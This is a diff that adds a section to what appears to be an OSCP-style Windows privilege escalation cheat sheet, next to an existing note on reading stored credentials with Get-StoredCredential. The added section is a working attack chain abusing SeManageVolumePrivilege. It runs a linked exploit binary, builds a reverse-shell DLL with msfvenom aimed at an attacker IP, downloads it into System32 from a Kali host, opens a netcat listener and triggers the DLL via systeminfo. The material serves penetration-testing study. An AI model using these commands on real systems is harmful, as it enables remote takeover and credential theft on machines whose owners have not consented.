@@ -265,3 +265,33 @@ Access stored credentials in Credential Manager to obtain sensitive information
 #### Access Credential Manager in Powershell
 
     Get-StoredCredential -Target "SomeCredential"
+
+# SeManageVolumeAbuse
+
+With this privilege, an attacker can gain full control over C:\ by crafting and placing a malicious .dll file in C:\Windows\System32\
+
+Link: https://github.com/emmasolis1/OSCP/blob/main/04.privilege_escalation/windows/SeManageVolumeExploit.exe
+
+### 1) Check for permission
+
+    whoami /priv
+
+### 2) Download and run the executable on target
+
+    .\SeManageVolumeExploit
+
+### 3) Create the malicious DLL
+
+    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll
+
+### 4) Transfer the DLL to the victim in C:\Windows\System32\wbem\tzres.dll
+
+    iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
+
+### 5) Setup listener
+
+    nc -lvnp 4444
+
+### 6) Run systeminfo to trigger the DLL
+
+    systeminfo
